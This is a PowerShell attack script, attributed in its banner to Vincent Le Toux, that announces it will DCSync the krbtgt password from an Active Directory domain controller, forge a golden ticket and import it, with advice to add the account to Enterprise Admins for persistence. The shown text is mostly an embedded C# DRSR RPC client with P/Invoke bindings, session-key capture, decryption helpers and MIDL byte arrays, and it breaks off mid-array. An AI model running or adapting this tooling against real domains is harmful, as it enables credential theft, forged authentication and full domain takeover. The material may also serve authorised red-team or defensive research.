
Write-Host "======================================================================"
Write-Host "  /\     Elevated Domain Admins to Enterprise Admins     - version 1.0"
Write-Host "  ||"
Write-Host " /||\    Require: domain admin right "
Write-Host "|:||:|             or more specifically DS-Replication-Get-Changes-All"
Write-Host "|/||\|   Vincent LE TOUX (vincent.letoux@mysmartlogon.com)"
Write-Host "======================================================================"
Write-Host ""
Write-Host "This will execute:"
Write-Host " - dcsync to extract the krbtgt password"
Write-Host " - build a golden ticket "
Write-Host " - import it"
Write-Host ""
Write-Host "Once succeed, you will have to add the account in the Enterprise admin group for persistence"
Write-Host ""
Write-Host "======================================================================"

$sourceDrsr = @"
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace drsrdotnet
{
        public class drsr
        {

            #region pinvoke

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFromStringBindingW",
            CallingConvention = CallingConvention.StdCall,
            CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
               CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, __arglist);
            //private static extern IntPtr NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr a, out IntPtr z, long s);

            [DllImport("Rpcrt4.dll", EntryPoint = "NdrClientCall2", CallingConvention = CallingConvention.Cdecl,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern IntPtr NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingFree", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingFree(ref IntPtr lpString);

            //#region RpcStringBindingCompose

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcStringBindingComposeW", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcStringBindingCompose(
                String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options,
                out IntPtr lpBindingString
                );

            [StructLayout(LayoutKind.Sequential)]
            private struct RPC_SECURITY_QOS
            {
                public Int32 Version;
                public Int32 Capabilities;
                public Int32 IdentityTracking;
                public Int32 ImpersonationType;
            };

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetAuthInfoExW", CallingConvention = CallingConvention.StdCall,
                CharSet = CharSet.Unicode, SetLastError = false)]
            private static extern Int32 RpcBindingSetAuthInfoEx(IntPtr lpBinding, string ServerPrincName,
                                               UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr identity, UInt32 AuthzSvc, ref RPC_SECURITY_QOS SecurityQOS);

            [DllImport("Rpcrt4.dll", EntryPoint = "RpcBindingSetOption", CallingConvention = CallingConvention.StdCall, SetLastError = false)]
            private static extern Int32 RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

            [DllImport("Rpcrt4.dll", EntryPoint = "I_RpcBindingInqSecurityContext", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
            private static extern Int32 I_RpcBindingInqSecurityContext(IntPtr Binding, out IntPtr SecurityContextHandle);


            [StructLayout(LayoutKind.Sequential)]
            private struct SecPkgContext_SessionKey
            {
                public UInt32 SessionKeyLength;
                public IntPtr SessionKey;
            }

            [DllImport("secur32.Dll", CharSet = CharSet.Auto, SetLastError = false)]
            private static extern int QueryContextAttributes(IntPtr hContext,
                                                            uint ulAttribute,
                                                            ref SecPkgContext_SessionKey pContextAttributes);

            [StructLayout(LayoutKind.Sequential)]
            private struct CRYPTO_BUFFER
            {
                public UInt32 Length;
                public UInt32 MaximumLength;
                public IntPtr Buffer;
            }

            [DllImport("advapi32.Dll", CharSet = CharSet.Auto, SetLastError = false, EntryPoint = "SystemFunction032")]
            private static extern int SystemFunction032(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key);

            private static byte[] RtlEncryptDecryptRC4(byte[] input, byte[] key)
            {
                CRYPTO_BUFFER inputBuffer = new CRYPTO_BUFFER();
                inputBuffer.Length = inputBuffer.MaximumLength = (UInt32)input.Length;
                inputBuffer.Buffer = Marshal.AllocHGlobal(input.Length);
                Marshal.Copy(input, 0, inputBuffer.Buffer, input.Length);
                CRYPTO_BUFFER keyBuffer = new CRYPTO_BUFFER();
                keyBuffer.Length = keyBuffer.MaximumLength = (UInt32)key.Length;
                keyBuffer.Buffer = Marshal.AllocHGlobal(key.Length);
                Marshal.Copy(key, 0, keyBuffer.Buffer, key.Length);
                int ret = SystemFunction032(ref inputBuffer, ref keyBuffer);
                byte[] output = new byte[inputBuffer.Length];
                Marshal.Copy(inputBuffer.Buffer, output, 0, output.Length);
                Marshal.FreeHGlobal(inputBuffer.Buffer);
                Marshal.FreeHGlobal(keyBuffer.Buffer);
                return output;
            }

            [DllImport("advapi32.dll", SetLastError = true, EntryPoint = "SystemFunction027")]
            private static extern int RtlDecryptDES2blocks1DWORD(byte[] data, ref UInt32 key, IntPtr output);


            [DllImport("advapi32.dll", SetLastError = true)]
            private static extern IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);

            [DllImport("advapi32.dll", SetLastError = true)]
            private static extern IntPtr GetSidSubAuthorityCount(IntPtr psid);
            #endregion

            #region rpc initialization

            private byte[] MIDL_ProcFormatString;
            private byte[] MIDL_TypeFormatString;
            private GCHandle procString;
            private GCHandle formatString;
            private GCHandle stub;
            private GCHandle faultoffsets;
            private GCHandle clientinterface;

            public UInt32 RPCTimeOut = 1000;

            [StructLayout(LayoutKind.Sequential)]
            private struct COMM_FAULT_OFFSETS
            {
                public short CommOffset;
                public short FaultOffset;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct GENERIC_BINDING_ROUTINE_PAIR
            {
                public IntPtr Bind;
                public IntPtr Unbind;
            }


            [StructLayout(LayoutKind.Sequential)]
            private struct RPC_VERSION
            {
                public ushort MajorVersion;
                public ushort MinorVersion;

                public RPC_VERSION(ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
                {
                    MajorVersion = InterfaceVersionMajor;
                    MinorVersion = InterfaceVersionMinor;
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct RPC_SYNTAX_IDENTIFIER
            {
                public Guid SyntaxGUID;
                public RPC_VERSION SyntaxVersion;
            }



            [StructLayout(LayoutKind.Sequential)]
            private struct RPC_CLIENT_INTERFACE
            {
                public uint Length;
                public RPC_SYNTAX_IDENTIFIER InterfaceId;
                public RPC_SYNTAX_IDENTIFIER TransferSyntax;
                public IntPtr /*PRPC_DISPATCH_TABLE*/ DispatchTable;
                public uint RpcProtseqEndpointCount;
                public IntPtr /*PRPC_PROTSEQ_ENDPOINT*/ RpcProtseqEndpoint;
                public IntPtr Reserved;
                public IntPtr InterpreterInfo;
                public uint Flags;

                public static readonly Guid IID_SYNTAX = new Guid(0x8A885D04u, 0x1CEB, 0x11C9, 0x9F, 0xE8, 0x08, 0x00, 0x2B,
                                                                  0x10,
                                                                  0x48, 0x60);

                public RPC_CLIENT_INTERFACE(Guid iid, ushort InterfaceVersionMajor, ushort InterfaceVersionMinor)
                {
                    Length = (uint)Marshal.SizeOf(typeof(RPC_CLIENT_INTERFACE));
                    RPC_VERSION rpcVersion = new RPC_VERSION(InterfaceVersionMajor, InterfaceVersionMinor);
                    InterfaceId = new RPC_SYNTAX_IDENTIFIER();
                    InterfaceId.SyntaxGUID = iid;
                    InterfaceId.SyntaxVersion = rpcVersion;
                    rpcVersion = new RPC_VERSION(2, 0);
                    TransferSyntax = new RPC_SYNTAX_IDENTIFIER();
                    TransferSyntax.SyntaxGUID = IID_SYNTAX;
                    TransferSyntax.SyntaxVersion = rpcVersion;
                    DispatchTable = IntPtr.Zero;
                    RpcProtseqEndpointCount = 0u;
                    RpcProtseqEndpoint = IntPtr.Zero;
                    Reserved = IntPtr.Zero;
                    InterpreterInfo = IntPtr.Zero;
                    Flags = 0u;
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct MIDL_STUB_DESC
            {
                public IntPtr /*RPC_CLIENT_INTERFACE*/ RpcInterfaceInformation;
                public IntPtr pfnAllocate;
                public IntPtr pfnFree;
                public IntPtr pAutoBindHandle;
                public IntPtr /*NDR_RUNDOWN*/ apfnNdrRundownRoutines;
                public IntPtr /*GENERIC_BINDING_ROUTINE_PAIR*/ aGenericBindingRoutinePairs;
                public IntPtr /*EXPR_EVAL*/ apfnExprEval;
                public IntPtr /*XMIT_ROUTINE_QUINTUPLE*/ aXmitQuintuple;
                public IntPtr pFormatTypes;
                public int fCheckBounds;
                /* Ndr library version. */
                public uint Version;
                public IntPtr /*MALLOC_FREE_STRUCT*/ pMallocFreeStruct;
                public int MIDLVersion;
                public IntPtr CommFaultOffsets;
                // New fields for version 3.0+
                public IntPtr /*USER_MARSHAL_ROUTINE_QUADRUPLE*/ aUserMarshalQuadruple;
                // Notify routines - added for NT5, MIDL 5.0
                public IntPtr /*NDR_NOTIFY_ROUTINE*/ NotifyRoutineTable;
                public IntPtr mFlags;
                // International support routines - added for 64bit post NT5
                public IntPtr /*NDR_CS_ROUTINES*/ CsRoutineTables;
                public IntPtr ProxyServerInfo;
                public IntPtr /*NDR_EXPR_DESC*/ pExprInfo;
                // Fields up to now present in win2000 release.

                public MIDL_STUB_DESC(IntPtr pFormatTypesPtr, IntPtr RpcInterfaceInformationPtr,
                                        IntPtr pfnAllocatePtr, IntPtr pfnFreePtr, IntPtr aGenericBindingRoutinePairsPtr)
                {
                    pFormatTypes = pFormatTypesPtr;
                    RpcInterfaceInformation = RpcInterfaceInformationPtr;
                    CommFaultOffsets = IntPtr.Zero;
                    pfnAllocate = pfnAllocatePtr;
                    pfnFree = pfnFreePtr;
                    pAutoBindHandle = IntPtr.Zero;
                    apfnNdrRundownRoutines = IntPtr.Zero;
                    aGenericBindingRoutinePairs = aGenericBindingRoutinePairsPtr;
                    apfnExprEval = IntPtr.Zero;
                    aXmitQuintuple = IntPtr.Zero;
                    fCheckBounds = 1;
                    Version = 0x50002u;
                    pMallocFreeStruct = IntPtr.Zero;
                    MIDLVersion = 0x8000253;
                    aUserMarshalQuadruple = IntPtr.Zero;
                    NotifyRoutineTable = IntPtr.Zero;
                    mFlags = new IntPtr(0x00000001);
                    CsRoutineTables = IntPtr.Zero;
                    ProxyServerInfo = IntPtr.Zero;
                    pExprInfo = IntPtr.Zero;
                }
            }

            private void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, ushort MajorVerson, ushort MinorVersion)
            {
                this.MIDL_ProcFormatString = MIDL_ProcFormatString;
                this.MIDL_TypeFormatString = MIDL_TypeFormatString;
                procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);

                RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);

                COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
                commFaultOffset.CommOffset = -1;
                commFaultOffset.FaultOffset = -1;
                faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
                clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
                formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);

                MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                                clientinterface.AddrOfPinnedObject(),
                                                                Marshal.GetFunctionPointerForDelegate((allocmemory)AllocateMemory),
                                                                Marshal.GetFunctionPointerForDelegate((freememory)FreeMemory),
                                                                IntPtr.Zero);

                stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
            }

            private void freeStub()
            {
                procString.Free();
                faultoffsets.Free();
                clientinterface.Free();
                formatString.Free();
                stub.Free();
            }

            private static List<IntPtr> TrackedMemoryAllocations;

            delegate IntPtr allocmemory(int size);
            private static IntPtr AllocateMemory(int size)
            {
                IntPtr memory = Marshal.AllocHGlobal(size);
                if (TrackedMemoryAllocations != null)
                {
                    TrackedMemoryAllocations.Add(memory);
                }
                return memory;
            }

            delegate void freememory(IntPtr memory);
            private static void FreeMemory(IntPtr memory)
            {
                Marshal.FreeHGlobal(memory);
                if (TrackedMemoryAllocations != null && TrackedMemoryAllocations.Contains(memory))
                {
                    TrackedMemoryAllocations.Remove(memory);
                }
            }

            private static void EnableMemoryTracking()
            {
                TrackedMemoryAllocations = new List<IntPtr>();
            }

            private static void FreeTrackedMemoryAndRemoveTracking()
            {
                List<IntPtr> list = TrackedMemoryAllocations;
                TrackedMemoryAllocations = null;
                foreach (IntPtr memory in list)
                {
                    Marshal.FreeHGlobal(memory);
                }
            }

            private IntPtr Bind(string server)
            {
                IntPtr bindingstring = IntPtr.Zero;
                IntPtr binding = IntPtr.Zero;
                Int32 status;

                status = RpcStringBindingCompose(null, "ncacn_ip_tcp", server, null, null, out bindingstring);
                if (status != 0)
                    return IntPtr.Zero;
                status = RpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
                RpcBindingFree(ref bindingstring);
                if (status != 0)
                    return IntPtr.Zero;

                RPC_SECURITY_QOS qos = new RPC_SECURITY_QOS();
                qos.Version = 1;
                qos.Capabilities = 1;
                GCHandle qoshandle = GCHandle.Alloc(qos, GCHandleType.Pinned);

                status = RpcBindingSetAuthInfoEx(binding, "ldap/" + server, 6, 9, IntPtr.Zero, 0, ref qos);
                qoshandle.Free();
                if (status != 0)
                {
                    Unbind(binding);
                    return IntPtr.Zero;
                }
                securityCallbackDelegate = SecurityCallback;
                status = RpcBindingSetOption(binding, 10, Marshal.GetFunctionPointerForDelegate(securityCallbackDelegate));
                if (status != 0)
                {
                    Unbind(binding);
                    return IntPtr.Zero;
                }
                status = RpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
                if (status != 0)
                {
                    Unbind(binding);
                    return IntPtr.Zero;
                }
                return binding;
            }

            private static void Unbind(IntPtr hBinding)
            {
                RpcBindingFree(ref hBinding);
            }

            private byte[] SessionKey;

            SecurityCallbackDelegate securityCallbackDelegate;
            private delegate void SecurityCallbackDelegate(IntPtr context);
            private void SecurityCallback(IntPtr context)
            {
                IntPtr SecurityContextHandle;
                SecPkgContext_SessionKey sessionKey = new SecPkgContext_SessionKey();

                int res = I_RpcBindingInqSecurityContext(context, out SecurityContextHandle);
                if (res == 0)
                {
                    res = QueryContextAttributes(SecurityContextHandle, 9, ref sessionKey);
                    if (res == 0)
                    {
                        SessionKey = new byte[sessionKey.SessionKeyLength];
                        Marshal.Copy(sessionKey.SessionKey, SessionKey, 0, (int)sessionKey.SessionKeyLength);
                    }
                }
            }

            private IntPtr GetProcStringHandle(int offset)
            {
                return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset);
            }

            private IntPtr GetStubHandle()
            {
                return stub.AddrOfPinnedObject();
            }

            private IntPtr CallNdrClientCall2x86(int offset, params IntPtr[] args)
            {

                GCHandle stackhandle = GCHandle.Alloc(args, GCHandleType.Pinned);
                IntPtr result;
                try
                {
                    result = NdrClientCall2x86(GetStubHandle(), GetProcStringHandle(offset), stackhandle.AddrOfPinnedObject());
                }
                finally
                {
                    stackhandle.Free();
                }
                return result;
            }
            #endregion

            #region MIDL strings

            private static byte[] MIDL_ProcFormatStringx64 = new byte[] {
                0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x30,0x00,0x32,0x00,0x00,0x00,0x44,0x00,0x40,0x00,0x47,0x05,0x0a,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,
                0x0a,0x00,0x08,0x00,0x02,0x00,0x0b,0x00,0x10,0x00,0x18,0x00,0x13,0x20,0x18,0x00,0x3a,0x00,0x10,0x01,0x20,0x00,0x42,0x00,0x70,0x00,0x28,0x00,0x08,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x01,0x00,0x10,0x00,0x30,0xe0,0x00,0x00,0x00,0x00,0x38,0x00,0x40,0x00,0x44,0x02,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x18,0x01,0x00,0x00,0x4a,0x00,0x70,0x00,0x08,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x02,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,
                0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x03,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,
                0x2c,0x00,0x24,0x00,0x47,0x06,0x0a,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x4e,0x00,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,
                0x10,0x00,0x56,0x00,0x50,0x21,0x18,0x00,0x08,0x00,0x13,0x01,0x20,0x00,0xb6,0x02,0x70,0x00,0x28,0x00,0x08,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x04,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x05,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x06,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x07,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x08,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x09,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0a,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0b,0x00,
                0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x00,0x0c,0x00,
                0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,0x47,0x06,0x0a,0x47,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x08,0x00,0x00,0x00,0x4e,0x00,
                0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0xe0,0x05,0x50,0x21,0x18,0x00,0x08,0x00,0x13,0x21,0x20,0x00,0x42,0x06,0x70,0x00,0x28,0x00,0x08,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x0d,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x0e,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x0f,0x00,0x08,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x0a,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x00,0x48,0x00,0x00,0x00,0x00,0x10,0x00,0x30,0x00,0x30,0x40,0x00,0x00,0x00,0x00,0x2c,0x00,0x24,0x00,0x47,0x06,0x0a,0x47,0x01,0x00,0x01,0x00,0x00,0x00,
                0x00,0x00,0x08,0x00,0x00,0x00,0x4e,0x00,0x48,0x00,0x08,0x00,0x08,0x00,0x0b,0x01,0x10,0x00,0xc4,0x06,0x50,0x21,0x18,0x00,0x08,0x00,0x13,0x41,0x20,0x00,
                0xf8,0x06,0x70,0x00,0x28,0x00,0x08,0x00,0x00
            };

            private static byte[] MIDL_TypeFormatStringx64 = new byte[] {
                0x00,0x00,0x12,0x00,0x08,0x00,0x1d,0x00,0x08,0x00,0x01,0x5b,0x15,0x03,0x10,0x00,0x08,0x06,0x06,0x4c,0x00,0xf1,0xff,0x5b,0x12,0x00,0x18,0x00,0x1b,0x00,
                0x01,0x00,0x09,0x00,0xfc,0xff,0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x01,0x5b,0x17,0x03,0x04,0x00,0xe6,0xff,0x08,0x5b,0x11,0x14,
                0xdc,0xff,0x11,0x04,0x02,0x00,0x30,0xa0,0x00,0x00,0x11,0x04,0x02,0x00,0x30,0xe1,0x00,0x00,0x30,0x41,0x00,0x00,0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x00,
                0x08,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0xa8,0x00,0x05,0x00,0x04,0x00,0x00,0x00,0x66,0x01,0x05,0x00,0x00,0x00,
                0x7c,0x01,0x07,0x00,0x00,0x00,0x9e,0x01,0x08,0x00,0x00,0x00,0xbc,0x01,0x0a,0x00,0x00,0x00,0xec,0x01,0xff,0xff,0x15,0x07,0x18,0x00,0x0b,0x0b,0x0b,0x5b,
                0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x27,0x00,0x00,0x01,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,
                0x08,0x40,0x36,0x5b,0x12,0x20,0xdc,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x00,0x00,0x08,0x40,0x4c,0x00,0xe4,0xff,0x5c,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,
                0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x4c,0x00,0xca,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x20,0xc8,0xff,0x1d,0x00,0x1c,0x00,0x02,0x5b,0x15,0x00,
                0x1c,0x00,0x4c,0x00,0xf4,0xff,0x5c,0x5b,0x1b,0x01,0x02,0x00,0x09,0x57,0xfc,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0xa0,0x00,0x05,0x5b,
                0x17,0x03,0x38,0x00,0xe6,0xff,0x08,0x08,0x4c,0x00,0xd6,0xfe,0x4c,0x00,0xd2,0xff,0x08,0x5b,0x15,0x07,0x18,0x00,0x4c,0x00,0xc8,0xfe,0x0b,0x5b,0x1b,0x07,
                0x18,0x00,0x09,0x00,0xf8,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x4c,0x00,0xe0,0xff,0x5c,0x5b,0x17,0x07,0x10,0x00,0xe2,0xff,
                0x08,0x08,0x08,0x08,0x5c,0x5b,0x1b,0x03,0x04,0x00,0x09,0x00,0xfc,0xff,0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x08,0x5b,0x17,0x03,
                0x0c,0x00,0xe6,0xff,0x08,0x08,0x08,0x5b,0x1a,0x07,0x70,0x00,0x00,0x00,0x1a,0x00,0x4c,0x00,0x74,0xfe,0x4c,0x00,0x70,0xfe,0x36,0x4c,0x00,0xed,0xfe,0x36,
                0x36,0x4c,0x00,0x4f,0xff,0x08,0x08,0x08,0x08,0x5b,0x11,0x00,0x7c,0xff,0x12,0x00,0xae,0xff,0x12,0x00,0xcc,0xff,0x1b,0x00,0x01,0x00,0x09,0x00,0xfc,0xff,
                0x11,0x00,0x01,0x00,0x01,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x02,0x5b,0x17,0x03,0x04,0x00,0xe6,0xff,0x08,0x5b,0x1a,0x07,0x88,0x00,0x00,0x00,0x0c,0x00,
                0x4c,0x00,0x2a,0xfe,0x36,0x4c,0x00,0xa7,0xff,0x5b,0x11,0x00,0xe4,0xff,0x15,0x07,0x08,0x00,0x0b,0x5b,0x1a,0x07,0x60,0x00,0x00,0x00,0x1a,0x00,0x4c,0x00,
                0x0e,0xfe,0x4c,0x00,0x0a,0xfe,0x36,0x4c,0x00,0x87,0xfe,0x36,0x08,0x08,0x08,0x08,0x4c,0x00,0xde,0xff,0x5c,0x5b,0x11,0x00,0x16,0xff,0x12,0x00,0x48,0xff,
                0x1a,0x07,0xa8,0x00,0x00,0x00,0x12,0x00,0x4c,0x00,0xe6,0xfd,0x36,0x4c,0x00,0x63,0xff,0x36,0x36,0x4c,0x00,0xc5,0xfe,0x5b,0x11,0x00,0x9a,0xff,0x12,0x00,
                0x4a,0xff,0x12,0x00,0x46,0xff,0x1a,0x07,0x80,0x00,0x00,0x00,0x20,0x00,0x4c,0x00,0xc2,0xfd,0x4c,0x00,0xbe,0xfd,0x36,0x4c,0x00,0x3b,0xfe,0x36,0x08,0x08,
                0x08,0x08,0x4c,0x00,0x92,0xff,0x36,0x36,0x4c,0x00,0x94,0xfe,0x5c,0x5b,0x11,0x00,0xc4,0xfe,0x12,0x00,0xf6,0xfe,0x12,0x00,0x14,0xff,0x12,0x00,0x10,0xff,
                0x1a,0x07,0x88,0x00,0x00,0x00,0x22,0x00,0x4c,0x00,0x8c,0xfd,0x4c,0x00,0x88,0xfd,0x36,0x4c,0x00,0x05,0xfe,0x36,0x08,0x08,0x08,0x08,0x4c,0x00,0x5c,0xff,
                0x36,0x36,0x4c,0x00,0x5e,0xfe,0x08,0x40,0x5c,0x5b,0x11,0x00,0x8c,0xfe,0x12,0x00,0xbe,0xfe,0x12,0x00,0xdc,0xfe,0x12,0x00,0xd8,0xfe,0x11,0x0c,0x08,0x5c,
                0x11,0x00,0x02,0x00,0x2b,0x09,0x29,0x54,0x18,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0xa8,0x00,0x05,0x00,0x01,0x00,
                0x00,0x00,0x40,0x01,0x02,0x00,0x00,0x00,0x92,0x01,0x06,0x00,0x00,0x00,0x1e,0x02,0x07,0x00,0x00,0x00,0x54,0x02,0x09,0x00,0x00,0x00,0xb6,0x02,0xff,0xff,
                0x1b,0x00,0x01,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x90,0x01,0x02,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,
                0x08,0x40,0x36,0x5b,0x12,0x20,0xdc,0xff,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa0,0x00,0xff,0xff,
                0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,0xca,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,
                0x36,0x5b,0x12,0x20,0xc8,0xff,0x1a,0x03,0x18,0x00,0x00,0x00,0x00,0x00,0x08,0x40,0x4c,0x00,0xe4,0xff,0x5c,0x5b,0x21,0x03,0x00,0x00,0x19,0x00,0x00,0x00,
                0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x4c,0x00,
                0xca,0xff,0x5c,0x5b,0x1a,0x03,0x10,0x00,0x00,0x00,0x06,0x00,0x08,0x40,0x36,0x5b,0x12,0x20,0xc8,0xff,0x1a,0x03,0x20,0x00,0x00,0x00,0x0a,0x00,0x36,0x08,
                0x40,0x4c,0x00,0xe3,0xff,0x5b,0x12,0x00,0x82,0xfd,0xb1,0x07,0x28,0x00,0x00,0x00,0x00,0x00,0x08,0x40,0x0b,0x4c,0x00,0x53,0xfc,0x0b,0x5c,0x5b,0x21,0x07,
                0x00,0x00,0x09,0x00,0xf8,0xff,0x11,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
